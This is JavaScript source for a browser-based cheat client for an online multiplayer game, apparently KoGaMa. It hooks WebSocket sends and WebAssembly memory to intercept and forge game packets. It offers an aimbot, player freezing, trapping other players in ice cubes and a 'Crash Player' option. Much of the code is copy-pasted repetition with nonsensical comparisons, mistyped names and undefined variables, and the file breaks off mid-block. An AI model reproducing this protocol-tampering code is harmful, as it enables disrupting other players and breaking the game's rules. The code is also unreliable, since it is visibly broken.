
WebAssembly.Memory.prototype.scan = function(AOB){
    let result = []
    let bytes = AOB.split(" ")
    new Uint8Array(this.buffer).forEach((array)=>{
        array.forEach((byte, i)=>{
            if(byte == bytes[i]){
                result.push(byte)
            }
        })
    })
    return result.toString().replaceAll(",", " ")
}
WebAssembly.Memory.prototype._grow = WebAssembly.Memory.prototype.grow
WebAssembly.Memory.prototype.grow = function(){
    top.memory = new Uint8Array(this.buffer)
    this._grow(...arguments)
}
var surfno = false
var aimBot = false
var cubeBot = false
var cubeBot1 = false

let ws = WebSocket.prototype
ws._send = ws.send
ws.socket = null
ws.send = function(data) {
    if (!this._onmessage) {
        this._onmessage = this.onmessage
        this.onmessage = function(message) {
            _this = this
            let Data = new Uint8Array(message.data)
            if (CheatAPI.SERVER_BLOCKS.indexOf(Data[2]) != -1) {
                return;
            }
            let DecodedData = CheatAPI.FUNCTIONS.DECODE_TEXT([...Data])
            if (window.socks) {
                console.log(Data + "\n" + DecodedData)
            }
            if (Data[2] == 63) {
                window.kogamaload = true
            }

            if (Data[2] == 61) {
                let json = CheatAPI.FUNCTIONS.GET_JSON(DecodedData)
                CheatAPI.PLAYER.WOID = json[0].spawnRoleAvatarIds[0]
                for (var i = 0; i < json.length; i++) {
                    if (json[i].hasOwnProperty("UserName")) {
                        let player = {
                            USERNAME: json[i].UserName,
                            WOID: json[i + 2].activeSpawnRole
                        }
                        CheatAPI.PLAYERS.push(player)
                    }
                }
                let ints = CheatAPI.FUNCTIONS.GET_INTS(Data)
                //console.log(ints)
                let actorNumbers = []
                let firstActorNumber = 0
                ints.forEach((int, index)=>{//+3
                    if(index == 0){
                        actorNumbers.push(int)
                    }else{
                        if(actorNumbers.length <= CheatAPI.PLAYERS.length && int <= 999 && int >= 1 && actorNumbers.indexOf(int) == -1){
                            actorNumbers.push(int)
                        }
                    }
                })
                console.log(actorNumbers)
            }
            if (Data[2] == 16){
                let ints = CheatAPI.FUNCTIONS.GET_INTS([...Data])
                CheatAPI.FRIENDSHIP_INFOS = {
                    FriendshipID: ints[0],
                    ID: ints[1],
                    FriendID: ints[2]
                }
            }
            if (Data[2] == 255) {
                if (!window.first) {
                    CheatAPI.PLAYER.ACTORNR = CheatAPI.FUNCTIONS.GET_INTS(Data)[0]
                    window.first = true
                } else {
                    let json = CheatAPI.FUNCTIONS.GET_JSON(DecodedData)
                    let player = {
                        USERNAME: json[0].UserName,
                        WOID: 0
                    }
                    CheatAPI.PLAYERS.push(player)
                }
            }
            if (Data[2] == 104) {
                let json = CheatAPI.FUNCTIONS.GET_JSON(DecodedData)
                CheatAPI.PLAYERS[CheatAPI.PLAYERS.length - 1].WOID = json[0].SpawnRolesRuntimeData.spawnRoleAvatarIds[0]
                if(window.kogamaload){
                    let players = []
                    CheatAPI.PLAYERS.forEach((player)=>{
                        players.push(player.USERNAME)
                    })
                    window["Crash Player"].updateOptions(players)
                }
            }
            if (Data[2] == 71) {
                let json = CheatAPI.FUNCTIONS.GET_JSON(DecodedData)
                json.forEach((acessory)=>{
                    if(acessory.hasOwnProperty("url")){
                        let name = acessory.name
                        delete acessory.name
                        CheatAPI.ACESSORIES[name] = acessory
                    }
                })
            }
            if (Data[2] == 6) {
                let woid = CheatAPI.FUNCTIONS.GET_INTS(Data)[0]
                for (var i = 0; i < CheatAPI.PLAYERS.length; i++) {
                    if (CheatAPI.PLAYERS[i].WOID == woid) {
                        CheatAPI.PLAYERS.splice(i, i - 1)
                    }
                }
                if(window.kogamaload){
                    let players = []
                    CheatAPI.PLAYERS.forEach((player)=>{
                        players.push(player.USERNAME)
                    })
                    window["Crash Player"].updateOptions(players)
                }
            }

            if (Data[2] == 29 && CheatAPI.FUNCTIONS.GET_INTS(Data)[0] != CheatAPI.PLAYER.WOID && window.freezeplayers){
                return
            }
            if (Data[2] == 31 && window.aimbot && window.cubebot && cubebot1 && CheatAPI.FUNCTIONS.GET_INTS(Data)[0] == CheatAPI.PLAYER.WOID)
                return
             if (Data[2] == 32)
                return

            if (Data[2] == 2){
                if(window.freezeplayrs){
                    return
                }

                CheatAPI.PLAYERS.forEach((player, index)=>{
                    if(player.WOID == CheatAPI.FUNCTIONS.GET_INTS(Data)[0]){
                        let floats = CheatAPI.FUNCTIONS.GET_FLOATS([...Data])
                         if(window.aimbot && index == 1){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 2){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TOBYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 3){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 4){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                        if(window.aimbot && index == 5){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 6){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 7){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 8){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 9){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 10){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 11){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        } if(window.aimbot && index == 12){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 13){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 14){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 15){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 16){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 17){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 18){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 19){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == 20){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                        if(window.aimbot && index == Math.random()){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                         if(window.aimbot && index == [0,20]){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                        if(window.aimbot && index == function getRandomInt(max) {
                                return Math.floor(Math.random() * max);
                               }){
                            CheatAPI.SEND_SOCKET(243,4,31,0,8,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(CheatAPI.PLAYER.WOID),74,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),75,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),76,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[2]),77,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),78,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[1]),79,102,...CheatAPI.FUNCTIONS.TO_FLOAT_32(floats[0]),254,105,0,0,0,0)
                        }
                        if(window.cubebot1 && index == 1){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 2){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 3){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 4){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 5){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 6){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 7){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 8){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 9){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 10){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 11){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 12){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-2,floats[1]+1, floats[2]-1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]-2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+1, floats[2]+2,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]-1,floats[1]+3, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
                        }
                        if(window.cubebot1 && index == 13){
            CheatAPI.CHEATS.PLACE_CUBE(floats[0]+2,floats[1]+1, floats[2]+1,CheatAPI.MATERIAL_IDS.Ice, "BOTH")
